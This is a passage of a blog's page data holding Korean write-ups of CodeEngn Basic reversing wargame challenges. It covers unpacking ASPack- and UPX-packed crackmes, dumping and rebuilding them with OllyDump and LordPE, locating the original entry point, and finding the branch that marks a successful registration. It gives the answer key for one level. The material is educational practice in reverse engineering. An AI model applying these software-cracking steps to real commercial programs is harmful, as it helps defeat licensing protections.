<img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/386f348f6c04763d4b8160c4ec8973a5/d7398/1.png\"\n            alt=\"PEiD\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>\n<p>ASPack으로 패킹되어 있는듯하다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 400px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 27.878787878787882%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAGCAIAAABM9SnKAAAACXBIWXMAAA7DAAAOwwHHb6hkAAAA+klEQVR42mWP3UrDQBCFTzZNAqJiQ/xpsrO7zWa3KaFEG2JjW1AvY0UQvBZ8AMHX6MP4jpJcSKrDdzXDx5mDePKh08/Mfh15rwG9Z/u9fWlHFw+gHeIWpy3wy27AE/CGspxPrsLo8iwAsOT+97PbnHtLeAvXX7texYKS+Zz5I4a/c4xmVQNgrLuNw2S9rrXRSk2nMtXWkBL5Yq6NkUL0AgOcHgAnuK2rbue6AMJQbraPSipKOOc8TTUR5Xlu7SzLNADHcQ6S74bJY7HZ3OtMSyGUVMYYqVRRFNbO0qlCbx/I1c314G2xaraCSErV5QsRRRERJ6Ikif93/gEWfB/XLaAt6wAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/52b15f6309f0345bb7318edc687328f1/c9b55/2.webp 165w,\n/static/52b15f6309f0345bb7318edc687328f1/f2908/2.webp 330w,\n/static/52b15f6309f0345bb7318edc687328f1/7f61c/2.webp 400w\"\n              sizes=\"(max-width: 400px) 100vw, 400px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/52b15f6309f0345bb7318edc687328f1/04c57/2.png 165w,\n/static/52b15f6309f0345bb7318edc687328f1/d9ecf/2.png 330w,\n/static/52b15f6309f0345bb7318edc687328f1/e17e5/2.png 400w\"\n            sizes=\"(max-width: 400px) 100vw, 400px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/52b15f6309f0345bb7318edc687328f1/e17e5/2.png\"\n            alt=\"before unpack entrypoint\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>\n<p>언패킹 이전 entry point이다. 이를 언패킹하기 위해서는 retn 0c를 찾은 후, 그 아래에 있는 retn으로 돌아가면 된다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 401px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 15.151515151515152%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAADCAIAAAAcOLh5AAAACXBIWXMAAA7DAAAOwwHHb6hkAAAArUlEQVR42mMwMMxzcat1c6vT0MznZQnkTGkT6u7TVnfj4gri5gni5g7i5gmGMmCIhyeIhyeMhyeKQV1dVUxcVFpaUk5OioORkdU/mjM7nZudkZWVmZ2dhZWFiZWViZmFiY2NhYWFiZ2dhY2NmQEEWBgYuBkcHJ31DQxNjUzc3dyMjEyVNIz0TYy0dfRMTE319fVlpKWVFJXk5RV0tLS1NDTNzCzU1dTAmlkZGHgA9rsYjG2j8ZgAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/a04fed2d69eeaa7e222d28d2ee344e21/c9b55/3.webp 165w,\n/static/a04fed2d69eeaa7e222d28d2ee344e21/f2908/3.webp 330w,\n/static/a04fed2d69eeaa7e222d28d2ee344e21/b3c31/3.webp 401w\"\n              sizes=\"(max-width: 401px) 100vw, 401px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/a04fed2d69eeaa7e222d28d2ee344e21/04c57/3.png 165w,\n/static/a04fed2d69eeaa7e222d28d2ee344e21/d9ecf/3.png 330w,\n/static/a04fed2d69eeaa7e222d28d2ee344e21/9144d/3.png 401w\"\n            sizes=\"(max-width: 401px) 100vw, 401px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/a04fed2d69eeaa7e222d28d2ee344e21/9144d/3.png\"\n            alt=\"before unpack retn\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>\n<p>retn으로 돌아갔을 시 도달하는 곳이다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 554px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 23.03030303030303%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAFCAIAAADKYVtkAAAACXBIWXMAAA7DAAAOwwHHb6hkAAAAq0lEQVR42nWNsQrCMABEL6WBmphgkqpJaQsFqd2q1tHBoWonu/oJfoaD/rcQCoK0xw033LvD5/3qbk9j+nLzoPTM2ZWlLctPjLWjjqKL1n1R3I3pUFWlkGvOhbVLAAQBFIPGtAJgNsTmsI9Nxvkicc7DIdQchoAEvvdnAoQAG1Z2da1Vwrl0zv6eja+Ni1AqpRSUUhybJo5TIVWepQOsGVYTnF+U0lbVViv1BcgjELHxYGCdAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/6f74f0baf5d475464d9704b6875d96b1/c9b55/4.webp 165w,\n/static/6f74f0baf5d475464d9704b6875d96b1/f2908/4.webp 330w,\n/static/6f74f0baf5d475464d9704b6875d96b1/5e3e0/4.webp 554w\"\n              sizes=\"(max-width: 554px) 100vw, 554px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/6f74f0baf5d475464d9704b6875d96b1/04c57/4.png 165w,\n/static/6f74f0baf5d475464d9704b6875d96b1/d9ecf/4.png 330w,\n/static/6f74f0baf5d475464d9704b6875d96b1/04abd/4.png 554w\"\n            sizes=\"(max-width: 554px) 100vw, 554px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/6f74f0baf5d475464d9704b6875d96b1/04abd/4.png\"\n            alt=\"DB55\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>\n<p>여기에서 dump를 뜨고 LordPE라는 툴을 사용해 PE로 리빌드해준다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 455px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 80.60606060606061%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAQCAIAAACZeshMAAAACXBIWXMAAA7DAAAOwwHHb6hkAAADBUlEQVR42j3QW2+bSBgGYP7ibtOLvdqqUqUmvWmzlSq10mrVX2QpiiOlARIfMGBzmhgYAwMDw8FACGAbfFKkVYjSR+/F945mvouhPvz3/ePPH39///rux9f3/347OT87OT978+X0zZfTk/Ozt/98+l1fc/bn59O/vn3+4/Q95WDPDfzn+NhykWlbC+TYnoteK3Rs23N/x3LRAjkkiX+xDLVerbDnQRP62HcRur+/r6tq27ZRGGGM7wHo6na33W7b7X63q8rSNEwXuYPBgCqKwnEcCGGW57qua5pWFEWSJKZpom5X0zRxHGuaZhiGqqpBEGiaBgCgGYYqyzIIAozxcrlEnbIs4zh2XTfqvAyEkDAMCSF5nkdRVBSFIAhUVVWu6/q+jzEOwzDLsv1+/3LbdV2MsW3bTWe1Wq3X67quq6o6Ho+yLFNJkiCELMtyO1YHIQQhTNN0vV6vVqvHV0VRVFVVFEXbtpIkUQih29vb2Ww2Go0YhgEA8DzPMMzd3Z0kSTzP6x2e50VRNE2T53mO4yCEo/H4+bEgCHVdcxx3c3NT17WiKP1+P45jz/N6vZ5t22ma9vv96XRa1zXLsjRN27Z9eXlJeZ3j8agoiiAIbduapjkYDB4eHuI4ZlmWEFJV1XA4BADsdjtRFCVJchyn1+tRQRAghA6HgyRJHMdtNpv5fM4wzMuv0jTt+35ZlizLAgCapplMJjzPZ1nGMAxFCIEQHg6HyWTCsuxms1FV9erqKk1TQsjFxYXneY+Pj9fX15IkbTab8XhM0/TT05OiKFQURUEQLJdLXdcVRSGE6Louy7LnebZti6JoWRbGWJZlwzAIIaqqLiyraRpRFKllmi4sSwPAhNAPgmWaZlmW5/kyfZ7yPE/T9Pkwz+I4jqIoSZIsz9u2nUkSVZWltVgMh0NFlg1dN01TUZT5fG7oOgDAsixomvpcdxynaZp1p6qqw/6gyAoVRCG0LU7gZU2VVGUiCKI046ciPxUngiDMppzAD8YjYwHDJPZDEkQhJkFWPNyNhv8DpiEdMwZTgNkAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/ff0efbfbf7c530762a63f1f7aec952e8/c9b55/5.webp 165w,\n/static/ff0efbfbf7c530762a63f1f7aec952e8/f2908/5.webp 330w,\n/static/ff0efbfbf7c530762a63f1f7aec952e8/bb998/5.webp 455w\"\n              sizes=\"(max-width: 455px) 100vw, 455px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/ff0efbfbf7c530762a63f1f7aec952e8/04c57/5.png 165w,\n/static/ff0efbfbf7c530762a63f1f7aec952e8/d9ecf/5.png 330w,\n/static/ff0efbfbf7c530762a63f1f7aec952e8/379c3/5.png 455w\"\n            sizes=\"(max-width: 455px) 100vw, 455px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/ff0efbfbf7c530762a63f1f7aec952e8/379c3/5.png\"\n            alt=\"ollyDump\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 602px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 44.84848484848485%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAJCAIAAAC9o5sfAAAACXBIWXMAAA7DAAAOwwHHb6hkAAABo0lEQVR42mXRW2vUQBgG4PxiUREv6oUiVqsFEW/8ISJC2RYESZvm1N1mZ8bsTjLZlM0m42Qyh+ZQknjYxaXgw3v5wvvBZ6Tptda3SkmlJK+40rq76/7Xdm3bdU3b3m31fd80jYFgGEWR4NXn05NnH45fffp48P7tw9cvHh+9fHQvT94dPj1+8+Dw+ZezSbZeQ4SSJDF8+/IHQk3TAIS+nk5OzibfrQv7yptBEN+ky4TgVYJXSYDguWNfeO71fO65rmma0+nUsOxvl7altc6yLAgCvFyWjNW3tRRiHMdf/2ilRFWJqiKEhGHouu5isTCm/hXGuCiKYD43TdO2bc/3GWN93w/DMG4NwyCE4JyXnC8xDoLAcRwIoRFFUVEUUgoAoeM4860kSfI83y+P4yiEUFJxzqM4AgB4nvd3WUq5a8SE+L6PIJrNZkqp+zeP46iUAiFYZ+s4jjnnWmtKqSGE2DWS1ercslzPgwhKJZXW+0il8iLHMV7dpMsIE0IAAIQQg3PeNE1d10LKn4yxsmRlWexQug+llDFGKd1sNmmaYoz/vOo3pufYOxPHxccAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/fe25e2d4c736c1e861ec264ab7ab9219/c9b55/6.webp 165w,\n/static/fe25e2d4c736c1e861ec264ab7ab9219/f2908/6.webp 330w,\n/static/fe25e2d4c736c1e861ec264ab7ab9219/ff4b8/6.webp 602w\"\n              sizes=\"(max-width: 602px) 100vw, 602px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/fe25e2d4c736c1e861ec264ab7ab9219/04c57/6.png 165w,\n/static/fe25e2d4c736c1e861ec264ab7ab9219/d9ecf/6.png 330w,\n/static/fe25e2d4c736c1e861ec264ab7ab9219/32056/6.png 602w\"\n            sizes=\"(max-width: 602px) 100vw, 602px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/fe25e2d4c736c1e861ec264ab7ab9219/32056/6.png\"\n            alt=\"LordPE\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 558px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 15.75757575757576%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAADCAIAAAAcOLh5AAAACXBIWXMAAA7DAAAOwwHHb6hkAAAAnUlEQVR42mMoyM/PzyvS1AzQ042Uk/NmZzOXUQoytIy1Mo2VFHHh5bDm57Xj47flByE7MHKFMewYtLV11FQ1WVl5VFQULCwMDLXVpI3NNX1cpHV5OLQYGLQYGZUYGDkYGBnggBPBNDAy1NMx5OQUUFFV09PTU5SWl7B0VAkKUNZTUjRSk9SRklKTVlBQ4ucXYGBgZGRkYmTkBpMgBACsKxXc7cXgJwAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/11449e3deff3cba3e8f229eb451ff834/c9b55/7.webp 165w,\n/static/11449e3deff3cba3e8f229eb451ff834/f2908/7.webp 330w,\n/static/11449e3deff3cba3e8f229eb451ff834/1c397/7.webp 558w\"\n              sizes=\"(max-width: 558px) 100vw, 558px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/11449e3deff3cba3e8f229eb451ff834/04c57/7.png 165w,\n/static/11449e3deff3cba3e8f229eb451ff834/d9ecf/7.png 330w,\n/static/11449e3deff3cba3e8f229eb451ff834/42a8d/7.png 558w\"\n            sizes=\"(max-width: 558px) 100vw, 558px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/11449e3deff3cba3e8f229eb451ff834/42a8d/7.png\"\n            alt=\"entrypoint\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>\n<p>OEP는 445834이다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 602px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 28.484848484848484%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAGCAIAAABM9SnKAAAACXBIWXMAAA7DAAAOwwHHb6hkAAABBUlEQVR42nWPzW6CQBhFP2GYgdqRQYHOaClFYv/UDmgZoEZjY0pNF1ZcdNP3f48G20UX9eRubnJzkgvZ01cYfqpyW+yX7mPFZ2tHFu50wYPKQDlAAlAApP8ny+TqOblbv/XrQ5zyQXLhjpkQXjDwCTGgwYJTFHlZKjWvdqN6dzMbRXIobvtBGEZRTIgJ0AJoH4etP/mpGiil5OThWq3Cw/5Sci/1mGTuldvrdjVNAwCEKMYGxpgQous60hHGGCHUGPJcvSwXk817UH/4c5fmnfOyTUPKOgwZzcI0HUqpzZjjOIRgy7Js2z6zjl9UpuR0HKfl/es2TaJ4yB27x30uhPjVn/78Db6zHyHm2IkbAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/5a2536beb09568815fe5ec3b19ede95b/c9b55/8.webp 165w,\n/static/5a2536beb09568815fe5ec3b19ede95b/f2908/8.webp 330w,\n/static/5a2536beb09568815fe5ec3b19ede95b/ff4b8/8.webp 602w\"\n              sizes=\"(max-width: 602px) 100vw, 602px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/5a2536beb09568815fe5ec3b19ede95b/04c57/8.png 165w,\n/static/5a2536beb09568815fe5ec3b19ede95b/d9ecf/8.png 330w,\n/static/5a2536beb09568815fe5ec3b19ede95b/32056/8.png 602w\"\n            sizes=\"(max-width: 602px) 100vw, 602px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/5a2536beb09568815fe5ec3b19ede95b/32056/8.png\"\n            alt=\"JNZ\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>\n<p>한줄씩 실행시키면서 등록성공에 진입하는 것으로 보이는 분기문을 찾았다. 해당 OPCODE는  7555이다.</p>\n<p>정답: 004458347555</p>","categories":["writeup","wargame","reversing"],"date":"July 21, 2015","description":"","id":"72228b02-a6b8-5639-aed5-8404e43c86b0","keywords":["codeengn-basic"],"slug":"/CodeEngn-Basic-WriteUp-10/","title":"CodeEngn Basic 10","readingTime":{"text":"2 min read"}},{"banner":{"alt":null,"caption":null,"src":{"childImageSharp":{"gatsbyImageData":{"layout":"constrained","backgroundColor":"#f8f8f8","images":{"fallback":{"src":"/static/24569c63918c0307fbdc0b139453f528/94d04/0.png","srcSet":"/static/24569c63918c0307fbdc0b139453f528/8c9ae/0.png 58w,\n/static/24569c63918c0307fbdc0b139453f528/193e7/0.png 115w,\n/static/24569c63918c0307fbdc0b139453f528/94d04/0.png 230w","sizes":"(min-width: 230px) 230px, 100vw"},"sources":[{"srcSet":"/static/24569c63918c0307fbdc0b139453f528/0ad3d/0.webp 58w,\n/static/24569c63918c0307fbdc0b139453f528/6dc17/0.webp 115w,\n/static/24569c63918c0307fbdc0b139453f528/8bcd1/0.webp 230w","type":"image/webp","sizes":"(min-width: 230px) 230px, 100vw"}]},"width":660,"height":398.8695652173913}}}},"body":"<p>OEP를 찾으시오. Ex) 00401000 / Stolenbyte 를 찾으시오. Ex) FF35CA204000E84D000000\r\n정답인증은 OEP+ Stolenbyte\r\nEx ) 00401000FF35CA204000E84D000000</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 230px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 61.21212121212122%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAMCAIAAADtbgqsAAAACXBIWXMAAA7DAAAOwwHHb6hkAAABvklEQVR42qWO/WvTQBjH87cp7Bd/FgTXoW52bgOZdY52ja6din+WyvAHcaM4X6B5uSSXy8vd5Zre5ZKUtJdKM4aoAwU/fHl43r4Pj7be7ey9Pr7d2W31D+7rz+4c7rcH3YeDo3v6wVp748bm+s2ta7TRe3pr94HWHhw9fjPcfHHYHva3h/2t497eq+ePTvSdl3qr9+Rud/9a7ZzorV5HCwnO8lzkMrsSl1LIjGdZXpRFWeZlkRfFKjbJqjObFbMyTqjGM7FcLuu6Xv4zl8s8E9qU8ziKjO9mjDGwbd/32YS5NjANKwwRRMhzPWDaEPpjw/h28TUryssTjVnw6XQKHUiThBCCMaaUhj5ygJskNIpjHBPkoyiKLNv2XShk/tP8X2+zNFVKVVU1b6iq+VW6YrFYKKUWSjWjaj5flUqpuq5Zmmp+EAgh0jSd/gHnnBCCGjAmlNAwDIMggBAyxlAY/sWMEGKMFUVx9unj6ekHH6E8zwEAwLYjgrUgCqWUnHPxK5xzKaXneZZlQQjPz8/ev333+eILQmg0GgEAcEI1AD02mRBKaZL8poSxIAiMBuA4juuYlmWa5ng8xhg7PvwBKZ9ifElSp8AAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/24569c63918c0307fbdc0b139453f528/c9b55/0.webp 165w,\n/static/24569c63918c0307fbdc0b139453f528/a0b58/0.webp 230w\"\n              sizes=\"(max-width: 230px) 100vw, 230px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/24569c63918c0307fbdc0b139453f528/04c57/0.png 165w,\n/static/24569c63918c0307fbdc0b139453f528/81c8e/0.png 230w\"\n            sizes=\"(max-width: 230px) 100vw, 230px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/24569c63918c0307fbdc0b139453f528/81c8e/0.png\"\n            alt=\"crakme\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 224px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 63.63636363636363%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAANCAIAAAAmMtkJAAAACXBIWXMAAA7DAAAOwwHHb6hkAAABqElEQVR42p2RXW/TMBSG/bcQcI/EbkAwNDEQ0nYxGKKgAeOOXwWa+JoYY6xLIyeOmy5NlyZuBIWR5suxnaV2UDZxMypUePRcHFnn6D3WAbdfPFl63rrWWrv6YGVhfXVOl549uv74Prj1tLX6cnNhfeXC8o3LdxcvzeHFOzcXNx5eWbsHXn/afvtl993+5w/tvfl93957tbMNGOd1Xav6H1Cqac8oBXlBGWe0KBhjRcEKVgghTqqqLE+E4PQUxnmW50LwNMs4F5WUdV3HeQZoNrHtnn4AMbIQtAzddN1BmqRdZJkQDv0Aajru2Z32AbZtqGmWeXiW3ySfrS2nUkmppFJSNbVSUko5bRKax1Ok/F2dG/7PP0+SuCxLxmcjhChnMa2q4+gn+DYep0kazyJJkjAMCSGj0cj3/YCQESFhGHqeRwj5Oh7/bTiO4yAIoiiilO7ufNzaeuM4/TzPCSEIoe/HP0A0mQjOi+ZK5xWc+8Nh33G8oyOMkLbfxhgPPc9CyHWcOEkA7OLewLXd/p/2Bq5pdzUDdkxDRybElo7MjmloBuw6hzpGvwDf6oZ5vOailwAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/2de1ccec98885b007e480bff37877dd6/c9b55/1.webp 165w,\n/static/2de1ccec98885b007e480bff37877dd6/81b02/1.webp 224w\"\n              sizes=\"(max-width: 224px) 100vw, 224px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/2de1ccec98885b007e480bff37877dd6/04c57/1.png 165w,\n/static/2de1ccec98885b007e480bff37877dd6/80b2d/1.png 224w\"\n            sizes=\"(max-width: 224px) 100vw, 224px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/2de1ccec98885b007e480bff37877dd6/80b2d/1.png\"\n            alt=\"crackme_error\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>\n<p>프로그램을 실행시켜 보니 다음과 같은 창이 뜬다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 417px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 56.36363636363636%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAALCAIAAADwazoUAAAACXBIWXMAAA7DAAAOwwHHb6hkAAAB6klEQVR42k2QTY+bMBCG+ZfbZqXeemk32lTKbiL1kFN67I+qtrv5gPCRgDHGmDEmmGTBBvIDWsge8mhkzfidsTyv8XX5+9ty8X25ePi1uJ9PRrPJaD65/4gfo/nk8/PjaDb59DQezSZ30/Ho+fFuOv7yc/qwXBg71wsw+rt621jW63r15+XFdt3tznpdvZm2vTHNtWk6+z1NWQJpHymDjDt773W9MsryVNd1cSw48OJ4zHPBAdIUOECSJJCCLGQu8rZtu65r27ZpmrZpy0KSmBic84QmeZ5zAIyjLBO93LVt99GdZYJSmgnBWJplQmtd13VZlv0wxsR13DimJIp2lh2TWGutbqA08VwvppSSOAwxAJzPZylliLGRpkAISQESSn0/4MDrutY3AHBCCPQNseftUYCklGUpcRQZlLKo1zhL2LGQl8tFN7q5gSUs8P2YJgCp7weUJm3XSTkMV1VVvfdHv8xQXDn3vA91Vdf9rVLqaphSSmudCWFgjF3HPRwCxhhCiBCCQxzHFCHkuh5CyLYd3/d3tgMA17fPp7NSKj8eDUqpaZrOoOEw3G63m82WMZYLsV6tbdsRQsiisCzr4AecQ1EUntsbfN2ZoiAIAkQiopSqBq4+V1X/4SHVQ94beTqdwhABwH+3/wF0NSqNFVhUEQAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/0f3586ff5e66e94595a5a695add7d5c8/c9b55/2.webp 165w,\n/static/0f3586ff5e66e94595a5a695add7d5c8/f2908/2.webp 330w,\n/static/0f3586ff5e66e94595a5a695add7d5c8/b6b2f/2.webp 417w\"\n              sizes=\"(max-width: 417px) 100vw, 417px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/0f3586ff5e66e94595a5a695add7d5c8/04c57/2.png 165w,\n/static/0f3586ff5e66e94595a5a695add7d5c8/d9ecf/2.png 330w,\n/static/0f3586ff5e66e94595a5a695add7d5c8/f27fb/2.png 417w\"\n            sizes=\"(max-width: 417px) 100vw, 417px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/0f3586ff5e66e94595a5a695add7d5c8/f27fb/2.png\"\n            alt=\"PEiD\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>\n<p>PEiD로 확인해 보니 UPX로 패킹되어 있어서 이를 언패킹시켜 주었다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 602px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 26.060606060606062%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAFCAIAAADKYVtkAAAACXBIWXMAAA7DAAAOwwHHb6hkAAAAxElEQVR42l1Py27EIBAzA4TwGAIDbHaTdFt1+//fWIn2UNWyLFm2D8a233NkkSYivbUq0t7b7WvPF28H6gU/zNJd/xijD07MzErhF6p5WMBM44AFSIAABYhTK7ABYaY/zQD4yXVjMlSkNGlcGAo+hX7rSiuf/NiHWUxIUUYjS2S1IgUN0KQKnkM6zytnjjE97o8Q4vPtGWOopb4+X5nZOXccZ4qRiPAX/TjqVnLO8wyt60pE1lqttbF2dU5rDcBa+38JfAMn/gqhWRm15gAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/5b9d3cb28b613fc7119f3bad912ae6f7/c9b55/3.webp 165w,\n/static/5b9d3cb28b613fc7119f3bad912ae6f7/f2908/3.webp 330w,\n/static/5b9d3cb28b613fc7119f3bad912ae6f7/ff4b8/3.webp 602w\"\n              sizes=\"(max-width: 602px) 100vw, 602px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/5b9d3cb28b613fc7119f3bad912ae6f7/04c57/3.png 165w,\n/static/5b9d3cb28b613fc7119f3bad912ae6f7/d9ecf/3.png 330w,\n/static/5b9d3cb28b613fc7119f3bad912ae6f7/32056/3.png 602w\"\n            sizes=\"(max-width: 602px) 100vw, 602px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/5b9d3cb28b613fc7119f3bad912ae6f7/32056/3.png\"\n            alt=\"upx\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 602px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 43.63636363636364%; position: relative; bottom: 0; left: 0; background-image: 